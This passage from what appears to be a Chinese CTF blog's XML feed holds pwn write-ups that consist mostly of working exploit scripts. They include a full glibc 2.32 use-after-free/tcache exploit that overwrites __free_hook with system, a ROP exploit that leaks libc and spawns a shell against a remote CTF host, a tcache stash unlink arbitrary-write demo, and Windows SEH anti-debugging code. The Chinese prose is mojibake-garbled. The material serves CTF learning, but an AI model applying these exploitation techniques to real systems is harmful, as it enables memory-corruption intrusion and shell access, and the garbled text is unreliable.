class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(pack(heap + <span class="number">0x730</span>, __free_hook)))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure><p>â€‹    å®Œæ•´expå¦‚ä¸‹ä»…ä¾›å‚è€ƒï¼Œç”±äºæ•´ä¸ªç¨‹åºåœ¨å †å—ç¼–è¾‘çš„è¿‡ç¨‹ä¸­é™åˆ¶å¾ˆå®½æ¾ï¼Œå¤§å®¶å¯ä»¥è‡ªå·±å†™å‡ºæ›´å¤šç§exp</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line">binary = <span class="string">&#x27;./UAF_glibc2.32&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.32.so&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;size&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;index&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pack</span>(<span class="params">pos, ptr</span>):</span></span><br><span class="line">    <span class="keyword">return</span> (pos &gt;&gt; <span class="number">12</span>) ^ ptr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gdbg</span>():</span></span><br><span class="line">    gdb.attach(p)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== LEAK HEAP ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x90</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;?\n&quot;</span>)</span><br><span class="line">heap = u64(p.recv(<span class="number">5</span>)[-<span class="number">5</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">heap = heap &lt;&lt; <span class="number">12</span></span><br><span class="line">info(<span class="string">&quot;HEAP BASE ----&gt; &quot;</span> + <span class="built_in">hex</span>(heap))</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== LEAK LIBC ADDRESS ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;dawn it&#x27;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x80</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;protect&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">7</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(</span><br><span class="line">    <span class="string">&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">193</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line">info(<span class="string">&quot;LIBC ----&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">edit(<span class="number">7</span>, <span class="string">&#x27;\x00&#x27;</span>)</span><br><span class="line"></span><br><span class="line">message = <span class="string">&quot;======================== TCACHE ATTACK ======================&quot;</span></span><br><span class="line">success(message)</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(pack(heap + <span class="number">0x730</span>, __free_hook)))</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x20</span>, p64(libc_base + libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>â€‹                                                                                                                                            </p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> ptmalloc2 </tag>
            
            <tag> safe-linking </tag>
            
            <tag> libc-2.32 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf-pwnç³»åˆ—2</title>
      <link href="2021/05/11/pwn2/"/>
      <url>2021/05/11/pwn2/</url>
      
        <content type="html"><![CDATA[<h3 id="rootersctf-2019-babypwn"><a href="#rootersctf-2019-babypwn" class="headerlink" title="rootersctf_2019_babypwn"></a>rootersctf_2019_babypwn</h3><ul><li>è€ƒç‚¹ï¼šæ ˆæº¢å‡ºï¼Œropgadgetï¼Œleak libcï¼Œubuntu18å­—èŠ‚å¯¹é½</li></ul><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./rootersctf_2019_babypwn&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;libc-2.27.so&#x27;</span></span><br><span class="line">port = <span class="number">29701</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line">elf = ELF(binary)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">read_got = elf.got[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401223</span></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;What do you want me to echo back&gt; &quot;</span>)</span><br><span class="line">payload = <span class="number">0x100</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p64(pop_rdi_ret) + p64(puts_got) + p64(puts_plt) + p64(<span class="number">0x401146</span>)</span><br><span class="line">p.send(payload)</span><br><span class="line"></span><br><span class="line">libc_addr = u64(p.recvuntil(<span class="string">b&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - libc.sym[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">log.success(<span class="string">&quot;LIBC BASE:&#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(libc_addr)))</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;&gt; &quot;</span>)</span><br><span class="line">bss_base = <span class="number">0x404040</span></span><br><span class="line">read_plt = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">system = libc_addr + libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">sh = libc_addr + libc.search(<span class="string">b&quot;/bin/sh&quot;</span>).__next__()</span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line">payload = <span class="number">0x108</span> * <span class="string">b&#x27;a&#x27;</span> + p64(ret) + p64(pop_rdi_ret) + p64(sh) + p64(system)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
            <tag> buuctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tcache Stash Unlink Demo æ¼”ç¤º</title>
      <link href="2021/05/11/Tcache-Stash-Unlink-demo/"/>
      <url>2021/05/11/Tcache-Stash-Unlink-demo/</url>
      
        <content type="html"><![CDATA[<h3 id="å®ä¾‹æºç æ¼”ç¤º"><a href="#å®ä¾‹æºç æ¼”ç¤º" class="headerlink" title="å®ä¾‹æºç æ¼”ç¤º"></a>å®ä¾‹æºç æ¼”ç¤º</h3><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;inttypes.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">uint64_t</span> target = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">void</span> *p;</span><br><span class="line"><span class="keyword">char</span> *smallchunk1;</span><br><span class="line"><span class="keyword">char</span> *smallchunk2;</span><br><span class="line"></span><br><span class="line">setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ä½¿ç”¨æ­¤æ”»å‡»æ‰‹æ³•æ‚¨å¯ä»¥å®ç°å‘ä»»æ„åœ°å€å†™å…¥ä¸€ä¸ªå¤§æ•°\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ç›®æ ‡:%p,å€¼:0x%lx\n\n\n&quot;</span>,&amp;target,target);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;1.é¦–å…ˆç”³è¯·å…­å—0x60å¤§å°çš„chunkï¼Œç„¶åå…¨éƒ¨freeæ‰ä½¿ä¹‹è¿›å…¥tcahce binä¸­\n\n\n&quot;</span>);</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">6</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">p = <span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">free</span>(p);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;å…­å—è¿›å…¥tcacheçš„chunkåœ°å€ä¸º%p,%p,%p,%p,%p,%p\n\n\n&quot;</span>,p - (<span class="number">0x70</span> * <span class="number">5</span>), p - (<span class="number">0x70</span> * <span class="number">4</span>),p - (<span class="number">0x70</span> * <span class="number">3</span>),p - (<span class="number">0x70</span> * <span class="number">2</span>),p - (<span class="number">0x70</span> * <span class="number">1</span>),p);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;2.åœ¨smallbinä¸­åˆ¶é€ å‡ºä¸¤å—åŒæ ·å¤§å°çš„chunk\n\n\n&quot;</span>);</span><br><span class="line">smallchunk1 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ç”³è¯·çš„ä¸€ä¸ªè¶…è¿‡tcachebinå¤§å°èŒƒå›´çš„chunk:%p,åŒæ—¶ç”³è¯·ä¸€ä¸ªchunké˜²æ­¢æ­¤chunk freeåä¸top chunkåˆå¹¶\n\n\n&quot;</span>,smallchunk1);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1</span>);</span><br><span class="line"><span class="built_in">free</span>(smallchunk1);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ç”³è¯·ä¸€ä¸ªchunkä½¿å¾—å‰©ä¸‹çš„chunkçš„å¤§å°æ­£å¥½ä¸º0x70,éšåå†ç”³è¯·ä¸€ä¸ªå¤§äºunsorted binä¸­çš„chunk,ä½¿å¾—å‰©ä¸‹çš„0x70å¤§å°çš„chunkè¿›å…¥small binä¸­\n\n\n&quot;</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x70</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;æ­¤æ—¶smallbinä¸­å·²ç»æœ‰ä¸€ä¸ªchunk:%p,å†æ¥ç”¨åŒæ ·çš„æ–¹æ³•æ¥æ„é€ ä¸€ä¸ª\n\n\n&quot;</span>,smallchunk1 + <span class="number">0x3a0</span>);</span><br><span class="line"></span><br><span class="line">smallchunk2 = <span class="built_in">malloc</span>(<span class="number">0x410</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x80</span>);</span><br><span class="line"><span class="built_in">free</span>(smallchunk2);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x410</span> - <span class="number">0x70</span>);</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;small binä¸­çš„chunkä¸º %p  %p \n\n\n&quot;</span>,smallchunk1 + <span class="number">0x3a0</span>,smallchunk2 + <span class="number">0x3a0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ä¿®æ”¹åè¿›å…¥çš„chunkçš„bkä¸ºtarget-0x10,éšåç”¨callocç”³è¯·ä¸€ä¸ªchunk,è§¦å‘stashæœºåˆ¶,å®Œæˆå¯¹äºå‘ç›®æ ‡å†™å…¥å¤§æ•°çš„æ”»å‡»,è¾¾æˆäº†å’Œunsorted bin attackåŒæ ·çš„æ•ˆæœ\n&quot;</span>);</span><br><span class="line">*(<span class="keyword">uint64_t</span> *)(smallchunk2 + <span class="number">0x3a0</span> + <span class="number">0x18</span>) = (<span class="keyword">uint64_t</span> )(&amp;target) - <span class="number">0x10</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">calloc</span>(<span class="number">1</span>,<span class="number">0x60</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;ç›®æ ‡:%p,å€¼:0x%lx\n\n\n&quot;</span>,&amp;target,target);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/03/18/e2BxW9sMLPhygGU.png" alt="image-20210316153317569.png" style="zoom:50%;" /></p><p>ç›´æ¥å®šä½åˆ°æœ€åä¸€æ­¥åœ¨gdbä¸­è·Ÿè¸ªä¸€ä¸‹</p><p><img src="https://i.loli.net/2021/03/18/xkQwP3HmVvUBEs9.png" alt="image-20210316153932123.png" style="zoom:50%;" /></p><p><img src="https://i.loli.net/2021/03/18/zDCil4uMr2LqUSm.png" alt="image-20210316154421877.png" style="zoom:50%;" /></p><p><img src="https://i.loli.net/2021/03/18/6d4z2JrMKQnNSDE.png" alt="image-20210316154649615.png" style="zoom:43%;" /></p>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SEH</title>
      <link href="2021/05/10/SEH/"/>
      <url>2021/05/10/SEH/</url>
      
        <content type="html"><![CDATA[<h3 id="è¯´æ˜"><a href="#è¯´æ˜" class="headerlink" title="è¯´æ˜"></a>è¯´æ˜</h3><p>ç»“æ„åŒ–å¼‚å¸¸å¤„ç†ï¼ˆSEHï¼‰æ˜¯Windowsæ“ä½œç³»ç»Ÿæä¾›çš„å¼ºå¤§å¼‚å¸¸å¤„ç†åŠŸèƒ½ã€‚è€ŒVisual C++ä¸­çš„__<em>try{}/\</em>_finally{}å’Œ__try{}/__except{}ç»“æ„æœ¬è´¨ä¸Šæ˜¯å¯¹Windowsæä¾›çš„SEHçš„å°è£…ã€‚</p><h4 id="ç»“æ„"><a href="#ç»“æ„" class="headerlink" title="ç»“æ„"></a>ç»“æ„</h4><p>çº¿ç¨‹ä¿¡æ¯å—TIB</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">ExceptionList</span>;</span> <span class="comment">//å¼‚å¸¸çš„é“¾è¡¨</span></span><br><span class="line"></span><br><span class="line">     PVOID StackBase;</span><br><span class="line">     PVOID StackLimit;</span><br><span class="line">     PVOID SubSystemTib;</span><br><span class="line"></span><br><span class="line">     <span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">         PVOID FiberData;</span><br><span class="line">         DWORD Version;</span><br><span class="line">     &#125;;</span><br><span class="line"> </span><br><span class="line">     PVOID ArbitraryUserPointer;</span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">NT_TIB</span> *<span class="title">Self</span>;</span></span><br><span class="line">&#125; NT_TIB;</span><br></pre></td></tr></table></figure><p>  <strong>Fs:[0]æ€»æ˜¯æŒ‡å‘å½“å‰çº¿ç¨‹çš„TIBï¼Œå…¶ä¸­0åç§»çš„æŒ‡å‘çº¿ç¨‹çš„å¼‚å¸¸é“¾è¡¨ï¼Œå³ExceptionListæ˜¯æŒ‡å‘å¼‚å¸¸å¤„ç†é“¾è¡¨ï¼ˆEXCEPTION_REGISTRATIONç»“æ„ï¼‰çš„ä¸€ä¸ªæŒ‡é’ˆã€‚</strong></p><p>EXCEPTION_REGISTRATIONç»“æ„</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> &#123;</span></span><br><span class="line">     <span class="class"><span class="keyword">struct</span> _<span class="title">EXCEPTION_REGISTRATION_RECORD</span> *<span class="title">Prev</span>;</span> <span class="comment">//æŒ‡å‘å‰ä¸€ä¸ªEXCEPTION_REGISTRATIONçš„æŒ‡é’ˆ</span></span><br><span class="line">     PEXCEPTION_ROUTINE Handler; <span class="comment">//å½“å‰å¼‚å¸¸å¤„ç†å›è°ƒå‡½æ•°çš„åœ°å€</span></span><br><span class="line">&#125; EXCEPTION_REGISTRATION_RECORD;</span><br></pre></td></tr></table></figure><h4 id="æµç¨‹"><a href="#æµç¨‹" class="headerlink" title="æµç¨‹"></a>æµç¨‹</h4><p><img src="https://i.loli.net/2021/05/10/tYmBa6SMHI3juQO.png" style="zoom:50%;" /></p><h3 id="ä»£ç "><a href="#ä»£ç " class="headerlink" title="ä»£ç "></a>ä»£ç </h3><p>åŠ å…¥SEHçš„ä»£ç ï¼ˆæ²¡åŠ SEHä»£ç å»æ‰tryå’Œexceptç»“æ„å³å¯ï¼‰</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">__try</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>;</span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">__except(<span class="number">1</span>)&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;!!!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HELLO SEH!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>æ²¡æœ‰SEHçš„åæ±‡ç¼–</p><p><img src="https://i.loli.net/2021/05/10/uZ9m578Dv2Ni3sq.png" style="zoom:50%;" /></p><p>æŸ¥çœ‹åŠ å…¥SEHä»£ç åçš„åæ±‡ç¼–</p><p><img src="https://i.loli.net/2021/05/10/SKHl5T9VvxDQ43Y.png" style="zoom:50%;" /></p><p>çœŸæ­£çš„ä»£ç åœ¨xrefåé¢</p><p><img src="https://i.loli.net/2021/05/10/2DNHipujwUSrxn9.png" style="zoom:50%;" /></p><p>å¯ä»¥é€šè¿‡odæ”¹eipçš„å€¼ç»•è¿‡å¼‚å¸¸ä»£ç </p><p><img src="https://i.loli.net/2021/05/10/oOLAwI5Bnms7zaF.png" style="zoom:50%;" /></p><h4 id="åè°ƒè¯•"><a href="#åè°ƒè¯•" class="headerlink" title="åè°ƒè¯•"></a>åè°ƒè¯•</h4><p>å¯ç”¨äºåè°ƒè¯•ï¼Œä»£ç å¦‚ä¸‹</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;Windows.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function">EXCEPTION_DISPOSITION <span class="title">myExceptHandler</span><span class="params">( <span class="comment">// enum type</span></span></span></span><br><span class="line"><span class="function"><span class="params">struct _EXCEPTION_RECORD* ExceptionRecord, <span class="comment">// è®°å½•äº†ä¸€äº›å¼‚å¸¸ä¿¡æ¯</span></span></span></span><br><span class="line"><span class="function"><span class="params">PVOID EstablisherFrame,</span></span></span><br><span class="line"><span class="function"><span class="params">PCONTEXT pcontext,  <span class="comment">// å¯„å­˜å™¨ç¯å¢ƒ</span></span></span></span><br><span class="line"><span class="function"><span class="params">PVOID DisspatcherContext</span></span></span><br><span class="line"><span class="function"><span class="params">)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">DWORD isDebugger = <span class="number">0</span>;</span><br><span class="line">_asm&#123;</span><br><span class="line">mov eax,fs:[<span class="number">0x18</span>] <span class="comment">// teb</span></span><br><span class="line">mov eax,[eax+<span class="number">0x30</span>] <span class="comment">// peb</span></span><br><span class="line">movzx eax,byte ptr[eax+<span class="number">2</span>] <span class="comment">// å¦‚æœä¸º1è¡¨ç¤ºè¢«è°ƒè¯•</span></span><br><span class="line">mov isDebugger,eax</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(isDebugger)</span><br><span class="line">&#123;</span><br><span class="line">MessageBoxA(<span class="number">0</span>,<span class="string">&quot;Go out HACKERS!&quot;</span>,<span class="string">&quot;WARNING&quot;</span>,MB_OK);</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">MessageBoxA(<span class="number">0</span>,<span class="string">&quot;Exception Code Running&quot;</span>,<span class="string">&quot;TIPS&quot;</span>,MB_OK);</span><br><span class="line">pcontext -&gt; Eip += <span class="number">1</span>;</span><br><span class="line"><span class="keyword">return</span> ExceptionContinueExecution;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">DWORD exceptionFunAddr = (DWORD)myExceptHandler;</span><br><span class="line"></span><br><span class="line">_asm&#123;</span><br><span class="line">push exceptionFunAddr</span><br><span class="line">mov eax,fs:[<span class="number">0</span>]</span><br><span class="line">push eax</span><br><span class="line">mov fs:[<span class="number">0</span>],esp</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span>* str = <span class="literal">NULL</span>;</span><br><span class="line">str[<span class="number">0</span>] = <span class="string">&#x27;a&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;HELLO SEH!\n&quot;</span>);</span><br><span class="line">getchar();</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="References"><a href="#References" class="headerlink" title="References"></a>References</h3><p><a href="https://blog.csdn.net/xiaocaiju/article/details/25995495">https://blog.csdn.net/xiaocaiju/article/details/25995495</a></p><p><a href="https://www.cnblogs.com/Sna1lGo/p/14732048.html">https://www.cnblogs.com/Sna1lGo/p/14732048.html</a></p><p><a href="https://www.cnblogs.com/yilang/p/11233935.html">https://www.cnblogs.com/yilang/p/11233935.html</a></p><p><a href="http://www.cppblog.com/weiym/archive/2015/02/27/209884.html">http://www.cppblog.com/weiym/archive/2015/02/27/209884.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> -reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>æ··æ·†æŠ€æœ¯-æ§åˆ¶æµå¹³å¦åŒ– [SUCTF2019]hardcpp</title>
      <link href="2021/04/18/hardCpp/"/>
      <url>2021/04/18/hardCpp/</url>
      
